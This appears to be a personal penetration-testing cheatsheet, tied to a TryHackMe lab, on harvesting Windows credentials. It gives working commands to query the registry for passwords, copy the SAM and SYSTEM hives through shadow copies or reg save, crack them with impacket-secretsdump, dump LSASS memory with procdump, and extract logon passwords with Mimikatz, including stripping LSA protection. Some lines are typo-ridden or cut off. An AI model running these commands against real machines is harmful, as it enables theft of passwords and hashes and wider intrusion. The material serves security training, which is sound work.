

Credentials Harvesting is a term for any technique used to gain access to user and system credentials.

## Credential Access

Credentials are stored insecurely in various locations in systems:

-   Clear-text files - **Unsecured Credentials: Credentials In Files**Â ([T1552.001](https://attack.mitre.org/techniques/T1552/001/)).
	-   Commands history	
	-   Configuration files (Web App, FTP files, etc.)
	-   Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
	-   Backup files
	-   Shared files and folders
	-   Registry
		- `reg query HKLM /f password /t REG_SZ /s`
		- `reg query HKCU /f password /t REG_SZ /s`
	-   Source code
-   Database files
	- Third party databases
-   Memory - accessing memory is limited to administrator users who fully control the system
	-   Clear-text credentials
	-   Cached passwords
	-   AD Tickets
-   Password managers - misconfigurations and security flaws exist.
	- Built-in password managers (Windows)
	- Third-party: KeePass, 1Password, LastPass
-   Enterprise Vaults
-   Active Directory
	- Users descriptions: Admin sometimes leave password in the description for new employees
	- Group Policy SYSVOL: Leaked encryption keys, `Cpassword`
	- NTDS: `ndts.dit` file, on the domain controller
	- AD Attacks
-   Network Sniffing
	- Man-In-the-Middle attack against network protocols to steal NTLM hashes for later [[Pass-The-Hash]]

## Local Windows Credentials

- [[Keylogging]]
- `c:\Windows\System32\config\sam`, just copy and crack - encrypt [RC4](https://en.wikipedia.org/wiki/RC4) or [AES]https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
- [[Metasploit]]'s [Meterpreter]([[Meterpreter-Commands]]) shell has the `hashdump` command
- Volume Shadow Copy Service - its [documentation](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)
Microsoft Volume shadow copy service performs a volume backup while applications read/write on volumes. With administrator privileges use wmic to create a shadow volume copy.
```powershell
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows # verify the replication of the shadow volume
# copy should be \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
# copy the SAM database
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
# copy the decryption key
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```
- Registry Hives
```powershell
# Dump the SAM database
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```
Use `secretsdump` from [[Impacket-Cheatsheet]]
```bash
impacket-secretsdump -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```


## Local Security Authority Subsystem Service (LSASS)

In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory! Both non-protected and protected LSASS dumping discuss.

`reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa 0

Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. Windows system stores credentials in the LSASS process to enable users to access network resources and services. With Administrative privileges we can dump the LSASS process memory. MITRE ATT&CK framework defines as [OS Credential Dumping LSASS Memory (T1003)](https://attack.mitre.org/techniques/T1003/001/). Detail below are various methods:

#### Unprotected LSASS Dump

- GUI :`Open 'Task Manager' -> Detail tabs -> Right-Click on lssas.exe -> Create Dump File`
- [Sysinternals Suite]([[Sysinternals-Hub]])'s [procdump]([[Sysinternals-Procdump]]) with `procdump.exe -accepteula -ma lsass.exe C:\administrator\desktop\lsass_dump`

#### Extracting Credentials from LSASS Dump & LSA Protection Disabling 

[[Mimikatz-Cheatsheet]]

```powershell
privilege::debug
sekurlsa::logonpasswords
# ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
# Means LSA protection:
!+ # mimidrv.sys driver disables LSA protection.
!processprotect /process:lsass.exe /remove
```

## Windows Credential Manager


Credential Manager is Windows Features that stores credentials. These Authentication details are stored on the user's folder and are not shared among Windows user accounts and are cache in memory. Caterogies of Credentials stored by Windows Credential Manager:
Credential Categories | Contains
--- | ---
Web credentials  | Authentication details stored in Internet browsers or other applications.
Windows credentials |  Windows authentication details, such as NTLM or Kerberos.
Generic credentials |  Basic authentication details, such as clear-text usernames and passwords.
Certificate-based credentials |  Authenticated details based on certifications.

```powershell
vaultcmd /list
vaultcmd /listproperties:"$category" # Web credentials, Windows credentials, Generic credentials. Certificate-based credentials
```


## References

[Tryhackme Credential Harvesting](https://tryhackme.com/room/credharvesting)